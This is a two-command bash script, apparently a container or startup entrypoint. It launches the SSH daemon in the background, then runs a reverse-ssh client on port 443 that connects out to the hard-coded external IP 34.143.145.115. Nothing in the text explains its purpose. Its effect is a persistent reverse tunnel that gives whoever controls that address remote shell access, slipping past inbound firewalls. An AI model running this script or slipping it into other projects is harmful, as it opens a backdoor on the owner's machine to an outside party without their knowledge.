#!/bin/bash
/usr/sbin/sshd -D &

/usr/bin/reverse-ssh -p 443 34.143.145.115

